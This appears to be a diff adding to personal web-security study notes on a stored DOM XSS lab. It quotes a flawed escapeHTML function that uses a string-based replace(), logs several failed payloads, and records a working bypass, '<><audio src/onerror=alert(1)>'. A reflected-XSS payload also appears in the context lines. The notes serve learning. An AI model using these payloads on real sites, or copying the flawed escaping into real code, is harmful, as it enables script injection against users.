@@ -291,3 +291,113 @@ this.responseText: '{"results":[],"searchTerm":"\\\\"-alert(1)-\\"}//"}'
 
 // this finally worked - but still need deeper understanding why the second "-" wrecked it at first - it doesn't simply act as a separator?
 ```
+
+### Stored DOM XSS
+```js
+// what gets displayed:
+
+{
+	"avatar":"",
+	"website":"http://asdf.asdf",
+	"date":"2023-03-12T02:51:04.959314986Z",
+	"body":"asdf",
+	"author":"asdf"
+}
+
+// vulnerable part: /resources/js/loadCommentsWithVulnerableEscapeHtml.js
+
+// check their escapeHTML
+function escapeHTML(html) {
+	return html.replace('<', '&lt;').replace('>', '&gt;');
+}
+
+// avatar
+let avatarImgElement = document.createElement("img");
+avatarImgElement.setAttribute("class", "avatar");
+avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");
+
+// body
+if (comment.body) {
+	let commentBodyPElement = document.createElement('p');
+	commentBodyPElement.innerHTML = escapeHTML(comment.body);
+	commentSection.appendChild(commentBodyPElement);
+}
+
+// author + website
+if (comment.author) {
+	if (comment.website) {
+	  let websiteElement = document.createElement('a');
+	  websiteElement.setAttribute('id', 'author');
+	  websiteElement.setAttribute('href', comment.website);
+	  firstPElement.appendChild(websiteElement)
+}
+	let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+	firstPElement.innerHTML = newInnerHtml
+}
+
+// see that only comment.author is escaped, but not comment.website
+let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+firstPElement.innerHTML = newInnerHtml
+
+// when it loads: (using Debugger)
+
+newInnerHtml: '<a id="author" href="http://asdf.asdf"></a>asdf'
+
+// try:
+
+http://hola.com/url?="><script>alert(1)</script>
+
+// stopped: (") is HTML-encoded
+
+newInnerHtml: '<a id="author" href="http://hola.com/url?=&quot;><script>alert(1)</script>"></a>asdf'
+
+// try:
+
+http://hola.com/url?=javascript:alert(1)
+
+// res:
+
+newInnerHtml: '<a id="author" href="http://hola.com/url?=javascript:alert(1)"></a>asdf'
+
+// nope
+
+// turns out it's not the "website" field, it's the "comment body" that should be targeted because of the weak "replace()" function
+
+// body:
+
+<><>body
+
+// res:
+
+commentBodyPElement.innerHTML: "&lt;&gt;&lt;&gt;body"
+
+// body:
+
+<><h1>body</h1>
+
+// res:
+
+commentBodyPElement.innerHTML: "&lt;&gt;<h1>body</h1>" // vuln: see that only the first "<>" got encoded when treated as a string
+
+// body:
+
+<><script>alert(1)</script>
+
+// res:
+
+commentBodyPElement.innerHTML: "&lt;&gt;<script>alert(1)</script>" // doesn't execute - try force an error
+
+// body:
+
+<><audio src/onerror=alert(1)>
+
+// res:
+
+commentBodyPElement.innerHTML: '&lt;&gt;<audio src="" onerror="alert(1)"></audio>' // executed
+
+// so the key lesson here is how JavaScript's "replace()" function works
+// when the first argument is a string, the function only replaces the first occurrence
+// by simply including an extra set of angle brackets at the beginning, 
+// this extra set of angle brackets will be encoded, 
+// but any subsequent angle brackets will be unaffected
+```
